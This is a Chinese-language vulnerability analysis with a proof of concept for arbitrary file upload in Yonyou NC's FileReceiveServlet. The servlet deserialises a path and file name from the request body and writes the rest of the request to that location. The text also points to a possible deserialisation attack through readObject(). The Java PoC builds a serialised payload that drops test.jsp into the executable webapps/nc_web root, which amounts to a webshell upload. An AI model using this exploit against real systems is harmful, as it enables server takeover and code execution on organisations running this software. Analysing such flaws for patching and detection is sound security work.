漏洞点:/servlet/FileReceiveServlet
根据web.xml 向导，查看对应servlet的映射。
/service/* 和 /servlet/* 都对应nc.bs.framework.server.InvokerServlet 类
其类在/yonyou\home\lib\fwserver.jar 包内
其servlet的doGet和doPost方法都指向doAction方法
这里直接看doAction方法就可以了
这里主要是根据request.getPathInfo()的值获取了对应的moduleName和
serviceName
最终将值传递给了getServiceObject方法
其getServiceObject的主要作用是根据moduleName和serviceName去查找服
务。
最终问题在于FileReceiveServlet。
根据文档，FileReceiveServlet所对应的类为
com.yonyou.ante.servlet.FileReceiveServlet
jar包所在目录:/yonyou\home\modules\uapss\lib
问题主要在68行，File outFile = new File(path, fileName);
这里创建了一个文件，导致任意文件上传。
不过这里需要注意的是。path和fileName的值是将req.getInputStream(); （io
流）进行反序列化操作并将结果传递给metaInfoi接口。
63行还调用了readObject()。还可以尝试一下反序列化漏洞。。。
path和filename分别获取metaInfo的TARGET_FILE_PATH键和FILE_NAME键
的值
70行，创建文件流，并将getInputStream 的内容进行写入。
造成任意文件上传。
编写POC:
这里参考了一下其他师傅的写法。
1
import java.io.ByteArrayOutputStream;
2
import java.io.IOException;
3
import java.io.InputStream;
4
import java.io.ObjectOutputStream;
5
import java.util.Map;
6
import java.io.*;
7
import java.util.HashMap;
8
9
10
public class test {
11
 public static void main(String[] args) throws IOException {
12
 Map metaInfo=new HashMap();
13
 metaInfo.put("TARGET_FILE_PATH","webapps/nc_web"); //nc6.5的默认目录为we
bapps/nc_web。
14
 //且该目录存在文件执行权限
15
 metaInfo.put("FILE_NAME","test.jsp"); //定义FILE_NAME键‐》值为test.jsp
16
 //根据File outFile = new File(path, fileName);
17
 //文件最终在/webapps/nc_web/test.jsp 也就是根目录下的test.jsp
18
 ByteArrayOutputStream bOut=new ByteArrayOutputStream();
19
 //创建字节缓冲区
20
 ObjectOutputStream os=new ObjectOutputStream(bOut);
21
 os.writeObject(metaInfo);
22
 InputStream in=test.class.getResourceAsStream("test.jsp");
23
 //读取test.jsp的内容
24
 byte[] buf=new byte[1024];
25
 int len=0;
26
 while ((len=in.read(buf))!=‐1){
27
 bOut.write(buf,0,len);
28
 }
29
 FileOutputStream fileOutputStream = new FileOutputStream("E:\\1.cer");
30
 fileOutputStream.write(bOut.toByteArray());
31
32
 }
33
}